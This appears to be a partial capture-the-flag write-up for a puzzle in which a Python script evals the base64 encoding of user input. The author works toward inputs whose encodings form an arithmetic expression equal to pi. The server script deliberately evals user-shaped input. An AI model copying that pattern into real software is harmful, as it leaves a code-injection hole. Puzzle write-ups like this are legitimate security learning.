## Description

```
Put two and two together and make pi.

Hint for beginners: Open the terminal app of Linux or Mac, and run the command described above (Windows user can use WSL for this). If you successfully connected, then put the random text into it and press the enter. ...You got an error, right? Here, the attached Python script is running, indeed. You will win if you can hack the script and make them output the content of flag.txt. I'm praying for your good fortune :)
```



The following server scripts are given:

```python
from base64 import b64encode
import math

exploit = input('? ')

if eval(b64encode(exploit.encode('UTF-8'))) == math.pi:
  print("flag")

```

We have to encode UTF-8 characters as base64 and make.pi. `math.pi=3.141592653589793`.

The base64 encoding result string consists of the following, so we can use expressions such as `division` and `addition` only and `1e4 = 10000` in the formula.
`"ABCDEFGHIJKLMNOPQRSVWXYZabcdeghiklmnopqrstuvxyz0123456789+/"`

Among them, you can find the results encoded as follows: We can use this to calculate `pi` from 0.1.

```
b64encode("㝿㝴") -> "452/4520"
b64encode("{M>") -> "e00+"
b64encode("{M~") -> "e01+"
...
b64encode("{Mw") -> "e013"
```
